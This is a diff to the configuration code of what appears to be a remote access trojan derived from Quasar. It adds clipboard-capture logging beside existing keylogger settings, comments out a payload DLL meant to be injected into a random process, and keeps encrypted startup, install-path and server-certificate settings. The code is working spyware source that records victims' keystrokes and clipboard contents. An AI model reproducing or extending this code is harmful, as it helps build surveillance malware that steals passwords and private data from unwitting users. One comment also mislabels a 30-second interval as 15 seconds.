@@ -1,5 +1,5 @@
-﻿using ByteEncodings;
-using Q3C273.Shared.Cryptography;
+﻿using Q3C273.Shared.Cryptography;
+using Q3C273.Shared.Utilities;
 using System;
 using System.IO;
 using System.Linq;
@@ -72,7 +72,7 @@ namespace Ton618.Config
         public static string INSTALLPATH = "";
         public static string LOGSPATH = "";
         public static bool UNATTENDEDMODE = false;
-        public static string PAYLOADDLL = ""; // Will be DLL-injected to random process
+        //public static string PAYLOADDLL = ""; // Will be DLL-injected to random process
 
         public static bool Initialize()
         {
@@ -88,8 +88,8 @@ namespace Ton618.Config
             STARTUPKEY = aes.Decrypt(STARTUPKEY);
             LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
             SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
-            SERVERCERTIFICATE = new X509Certificate2(Alphabet.Base95Alphabet.GetBytes(aes.Decrypt(SERVERCERTIFICATESTR)).ToArray());
-            PAYLOADDLL = aes.Decrypt(PAYLOADDLL);
+            SERVERCERTIFICATE = new X509Certificate2(Qase64.Decode(aes.Decrypt(SERVERCERTIFICATESTR)));
+            //PAYLOADDLL = aes.Decrypt(PAYLOADDLL);
             SetupPaths();
             return VerifyHash();
         }
@@ -103,6 +103,9 @@ namespace Ton618.Config
 
         public static long KeyLogFlushInterval = 15000; // 15 seconds
         public static long KeyLogRollSize = 5 * 1024 * 1024; // 5 MiB;
+        public static long ClipLogCaptureInterval = 1000; // 1 second
+        public static long ClipLogFlushInterval = 30000; // 15 seconds
+        public static long ClipLogRollSize = 8 * 1024 * 1024; // 8 MiB;
         #endregion
 
         static void SetupPaths()
@@ -116,9 +119,7 @@ namespace Ton618.Config
             try
             {
                 var csp = (RSACryptoServiceProvider)SERVERCERTIFICATE.PublicKey.Key;
-                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY)), CryptoConfig.MapNameToOID("SHA256"),
-                    Alphabet.Base95Alphabet.GetBytes(SERVERSIGNATURE).ToArray());
-
+                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY)), CryptoConfig.MapNameToOID("SHA256"), Qase64.Decode(SERVERSIGNATURE));
             }
             catch (Exception e)
             {
